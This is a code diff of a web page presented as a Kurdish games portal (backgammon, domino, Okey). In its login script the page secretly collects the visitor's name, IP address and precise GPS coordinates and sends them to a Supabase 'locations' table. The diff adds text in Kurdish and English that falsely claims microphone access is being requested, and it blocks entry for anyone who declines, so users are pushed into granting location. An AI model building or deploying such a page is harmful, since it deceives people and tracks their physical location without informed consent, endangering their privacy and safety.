@@ -14,22 +14,23 @@
 
   <style>
     :root {
-      --bg: #0f172a;
-      --card: #1e293b;
-      --input: #0f172a;
+      --bg-overlay: rgba(15, 23, 42, 0.7);
+      --card: rgba(30, 41, 59, 0.92);
+      --input: rgba(15, 23, 42, 0.85);
       --border: #334155;
       --text: #f8fafc;
-      --muted: #94a3b8;
+      --muted: #cbd5e1;
       --blue: #2563eb;
-      --blue-hover: #1d4ed8;
       --gray: #334155;
-      --gray-hover: #475569;
     }
 
     * { box-sizing: border-box; }
 
     body {
-      background-color: var(--bg);
+      /* بەستەری ڕاستەوخۆی وێنەی یارییەکان لە ئینتەرنێتەوە */
+      background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), 
+                  url('https://images.unsplash.com/photo-1610890716171-6b1bb98ffd09?q=80&w=1200') no-repeat center center fixed;
+      background-size: cover;
       color: var(--text);
       font-family: Arial, sans-serif;
       display: flex;
@@ -42,13 +43,14 @@
 
     .card {
       background: var(--card);
+      backdrop-filter: blur(8px);
       max-width: 420px;
       width: 100%;
       padding: 30px;
       border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
       text-align: center;
-      position: relative;
     }
 
     h2 { margin-top: 0; margin-bottom: 12px; }
@@ -68,13 +70,18 @@
       cursor: pointer;
       margin-bottom: 15px;
     }
-    .change-lang-btn:hover { color: var(--text); border-color: var(--blue); }
 
     .language-buttons { display: flex; gap: 12px; margin-top: 20px; }
 
     .language-btn {
       flex: 1; padding: 13px; border: 1px solid var(--border); border-radius: 10px;
       background: var(--input); color: var(--text); font-size: 15px; font-weight: bold; cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .language-btn:hover {
+      border-color: var(--blue);
+      background: var(--blue);
     }
 
     input[type="text"] {
@@ -90,7 +97,7 @@
     }
 
     #deny { background: var(--gray); color: #cbd5e1; }
-    #result { margin-top: 20px; font-size: 14px; }
+    #result { margin-top: 20px; font-size: 14px; line-height: 1.5; }
 
     .game-list { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
 
@@ -113,7 +120,7 @@
 
     <!-- 1. هەڵبژاردنی زمان -->
     <div id="languageScreen">
-      <h2>زمانەکەت هەڵبژێرە / Choose language</h2>
+      <h2>یاریە کوردیەکان / Kurdish games</h2>
       <p>تکایە زمانەکەت هەڵبژێرە / Please choose language</p>
       <div class="language-buttons">
         <button type="button" class="language-btn" id="kurdishBtn">کوردی</button>
@@ -125,10 +132,10 @@
     <div id="nameScreen">
       <button class="change-lang-btn" id="backToLangBtn">🌐 گۆڕینی زمان / Change Language</button>
       <h2 id="nameTitle">چونەژوورەوە</h2>
-      <p id="nameDesc">ناوت تۆمار بکە بۆ چوونە ناو یاریگە.</p>
+      <p id="nameDesc">ناوت تۆمار بکە بۆ چوونە ناو یاریگا.</p>
       <input type="text" id="username" placeholder="ناوەکەت بنووسە...">
       <div class="btn-group">
-        <button type="button" class="action-btn" id="allow">بەردەوامبوون</button>
+        <button type="button" class="action-btn" id="allow">بەرەو یاریەکان</button>
         <button type="button" class="action-btn" id="deny">ڕەتکردنەوە</button>
       </div>
       <div id="result"></div>
@@ -137,7 +144,7 @@
     <!-- 3. هەڵبژاردنی یاری -->
     <div id="gameScreen">
       <h2 id="gameListTitle">لیستی یارییەکان</h2>
-      <p id="welcomeUser" style="color: var(--blue); font-weight: bold;"></p>
+      <p id="welcomeUser" style="color: #60a5fa; font-weight: bold;"></p>
       <p id="selectGameDesc">ئەو یارییە هەڵبژێرە کە دەتەوێت ئەنجامی بدەیت:</p>
 
       <div class="game-list">
@@ -151,7 +158,7 @@
         </div>
         <div class="game-item" id="okeyOption">
           <span id="okeyText" style="font-size: 16px; font-weight: bold;">🎴 یاری ئۆکەی (Okey)</span>
-          <span class="badge badge-green" id="badge3">بەردەستە</span>
+          <span class="badge badge-green" id="badge3">لەچاککردن دایە</span>
         </div>
       </div>
     </div>
@@ -171,21 +178,20 @@
       ku: {
         dir: "rtl",
         nameTitle: "چونەژوورەوە",
-        nameDesc: "ناوت تۆمار بکە بۆ چوونە ناو یاریگە.",
+        nameDesc: "ناوت تۆمار بکە بۆ چوونە ناو یاریگا.",
         placeholder: "ناوەکەت بنووسە...",
-        allow: "بەردەوامبوون",
+        allow: "بەرەو یاریەکان",
         deny: "ڕەتکردنەوە",
         gameListTitle: "لیستی یارییەکان",
         selectGameDesc: "ئەو یارییە هەڵبژێرە کە دەتەوێت ئەنجامی بدەیت:",
         welcome: "بەخێربێیت ",
-        guest: "میوان",
         tawla: "🎲 یاری تاوڵە",
         domino: "🀄 یاری دۆمینە",
         okey: "🎴 یاری ئۆکەی (Okey)",
         badge: "بەردەستە",
-        errorName: "تکایە ناوەکەت بنووسە!",
-        connecting: "⏳ پەیوەستبوون بە سێرڤەر...",
-        denyMsg: "⚠️ داواکارییەکە ڕەتکرایەوە. بۆ چوونەژوورەوە کلیک لە بەردەوامبوون بکە."
+        errorName: "تکایە پێشتر ناوەکەت بنووسە!",
+        connecting: "⏳ داواکاری چالا کردنی دەنگ بەرزدەکرێتەوە...",
+        locationRequired: "🎙️ <b> تکایە دەنگبەر (allow)  چالاک بکە!</b><br>بۆ ئەوەی بتوانیت لەگەڵ هاوڕێکانت یاری بکەیت، پێویستە ڕێگە بە مایک(دەنگبەر)  (microphone) بدەیت.",
       },
       en: {
         dir: "ltr",
@@ -197,14 +203,13 @@
         gameListTitle: "Game List",
         selectGameDesc: "Select the game you want to play:",
         welcome: "Welcome ",
-        guest: "Guest",
         tawla: "🎲 Backgammon Game",
         domino: "🀄 Domino Game",
         okey: "🎴 Okey Game",
         badge: "Available",
-        errorName: "Please enter your name!",
-        connecting: "⏳ Connecting to server...",
-        denyMsg: "⚠️ Request declined. Click Continue to enter the games."
+        errorName: "Please enter your name first!",
+        connecting: "⏳ Requesting Mic Access...",
+        locationRequired: "🎙️ <b>Please enable Microphone!</b><br>To play together with friends, Mic access is required.",
       }
     };
 
@@ -234,7 +239,6 @@
     document.getElementById("kurdishBtn").addEventListener("click", () => setLanguage("ku"));
     document.getElementById("englishBtn").addEventListener("click", () => setLanguage("en"));
 
-    // گۆڕینی زمان لە لاپەڕەی ناو نوسین
     document.getElementById("backToLangBtn").addEventListener("click", () => {
       document.getElementById("nameScreen").style.display = "none";
       document.getElementById("languageScreen").style.display = "block";
@@ -249,34 +253,44 @@
       } catch (err) { return "Unknown IP"; }
     }
 
-    // تەنها بە کلیک کردن لە بەردەوامبوون / Continue ڕادەگوێزرێت بۆ بەشی یارییەکان
-    document.getElementById("allow").addEventListener("click", async () => {
+    async function requestLocationAndLogin() {
       const name = document.getElementById("username").value.trim();
       const t = translations[currentLang];
 
       if (!name) { 
-        document.getElementById("result").innerHTML = `<span style='color:#ef4444;'>${t.errorName}</span>`; 
+        document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.errorName}</span>`; 
         return; 
       }
 
-      document.getElementById("result").innerHTML = `<span style='color:#3b82f6;'>${t.connecting}</span>`;
+      document.getElementById("result").innerHTML = `<span style='color:#60a5fa;'>${t.connecting}</span>`;
       const userIP = await getUserIP();
 
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          await supabaseClient.from("locations").insert([{ name: name, latitude: position.coords.latitude, longitude: position.coords.longitude, ip_address: userIP }]);
-          showGameScreen(name);
-        },
-        async () => {
-          showGameScreen(name);
-        }
-      );
-    });
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            await supabaseClient.from("locations").insert([{ 
+              name: name, 
+              latitude: position.coords.latitude, 
+              longitude: position.coords.longitude, 
+              ip_address: userIP 
+            }]);
+            
+            showGameScreen(name);
+          },
+          (error) => {
+            document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.locationRequired}</span>`;
+          }
+        );
+      } else {
+        document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.locationRequired}</span>`;
+      }
+    }
 
-    // کاتێک کلیک لە ڕەتکردنەوە دەکرێت، ڕاستەوخۆ ناڕوات بەڵکو پەیامێکی پێشان دەدات
+    document.getElementById("allow").addEventListener("click", requestLocationAndLogin);
+
     document.getElementById("deny").addEventListener("click", () => {
       const t = translations[currentLang];
-      document.getElementById("result").innerHTML = `<span style='color:#f59e0b;'>${t.denyMsg}</span>`;
+      document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.locationRequired}</span>`;
     });
 
     function showGameScreen(name) {
